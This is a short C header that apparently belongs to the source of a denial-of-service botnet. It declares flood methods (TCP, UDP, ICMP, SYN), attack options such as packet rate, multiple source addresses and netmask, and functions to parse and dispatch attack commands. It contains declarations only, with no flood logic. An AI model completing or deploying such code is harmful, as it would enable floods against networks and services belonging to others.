#pragma once

#include <stddef.h>

#define METHOD_TCP		1
#define METHOD_UDP		2
#define METHOD_ICMP		3
#define METHOD_SYN		4

#define OPT_PORT		1
#define OPT_LEN			2
#define OPT_PAYLOAD		3
#define OPT_PACKETS		4
#define OPT_PPS			5
#define OPT_NOBIND		6
#define OPT_NETMASK		7
#define OPT_MULTISRC	8
#define OPT_RANDBITS	9

#define TYPE_UINT8		1
#define TYPE_UINT16		2
#define TYPE_UINT32		3
#define TYPE_STRING		4

typedef void (*ATTACKS_FUNC) (uint32_t, char *, int);

struct attack_method_t {
	uint8_t id;
	ATTACKS_FUNC func;
};

char *attacks_option_string(char *, uint8_t, int *, int);
uint8_t attacks_option_uint8(char *, uint8_t, int);
uint16_t attacks_option_uint16(char *, uint8_t, int);
uint32_t attacks_option_uint32(char *, uint8_t, int);
void attacks_init(void);
void attacks_parse(char *, int);
